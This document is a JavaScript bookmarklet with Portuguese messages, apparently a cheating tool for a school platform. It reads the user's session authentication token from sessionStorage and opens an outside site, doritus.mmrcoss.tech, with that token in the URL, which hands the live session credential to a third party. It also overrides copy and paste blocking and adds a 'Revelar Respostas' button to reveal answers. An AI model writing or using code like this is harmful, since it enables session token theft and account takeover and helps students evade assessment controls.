javascript:(function() {
    try {
        let storedData = sessionStorage.getItem('sdf_web:state');
        if (storedData) {
            let jsonData = JSON.parse(storedData);
            let cacetekkk = jsonData.autenticacao?.tokenSessao;
            if (cacetekkk) {
                window.open(`https://doritus.mmrcoss.tech/?token=${cacetekkk}`);
            } else {
                alert('[ERROR] Certifique-se de estar logado para usar o Doritus >:(');
            }
        } else {
            alert('[ERROR] Certifique-se de estar logado para usar o Doritus >:(');
        }
    } catch (error) {
        alert(`[ERROR] Alguma porra Aconteceu: ${error}`);
    }

    // Função para remover bloqueios de copiar, cortar e colar
    function removeBlock() {
        const forceBrowserDefault = function(e) {
            e.stopImmediatePropagation();
            return true;
        };

        document.addEventListener('copy', forceBrowserDefault, true);
        document.addEventListener('cut', forceBrowserDefault, true);
        document.addEventListener('paste', forceBrowserDefault, true);
        alert("Block Removed!");
    }

    // Função para mostrar a tela preta com a mensagem
    function showSplashScreen() {
        var splashScreen = document.createElement('div');
        splashScreen.style.position = 'fixed';
        splashScreen.style.top = '0';
        splashScreen.style.left = '0';
        splashScreen.style.width = '100%';
        splashScreen.style.height = '100%';
        splashScreen.style.backgroundColor = '#000';
        splashScreen.style.color = '#fff';
        splashScreen.style.display = 'flex';
        splashScreen.style.alignItems = 'center';
        splashScreen.style.justifyContent = 'center';
        splashScreen.style.fontSize = '24px';
        splashScreen.style.zIndex = '1000';
        splashScreen.innerHTML = 'Desenvolvido Por ScxttZarek';

        document.body.appendChild(splashScreen);

        setTimeout(function() {
            document.body.removeChild(splashScreen);
            addButton();
        }, 3000); // A tela preta será exibida por 3 segundos
    }

    // Função para adicionar o botão "Revelar Respostas"
    function addButton() {
        var button = document.createElement('button');
        button.textContent = 'Revelar Respostas';
        button.style.position = 'fixed';
        button.style.top = '10px';
        button.style.right = '10px';
        button.style.padding = '10px';
        button.style.backgroundColor = '#007bff';
        button.style.color = '#fff';
        button.style.border = 'none';
        button.style.borderRadius = '5px';
        button.style.cursor = 'pointer';
        button.style.zIndex = '1000';

        button.onclick = function() {
            revealAnswers();
        };

        document.body.appendChild(button);
    }

    // Função para revelar respostas
    function revealAnswers() {
        // Substitua pelo seletor correto do botão ou elemento que revela as respostas
        var revealButton = document.querySelector('.reveal-answers-button'); // Ajustar o seletor conforme necessário

        if (revealButton) {
            revealButton.click();
        } else {
            alert('Não foi possível encontrar o botão para revelar as respostas.');
        }
    }

    // Executar as funções
    removeBlock();
    showSplashScreen();
})();
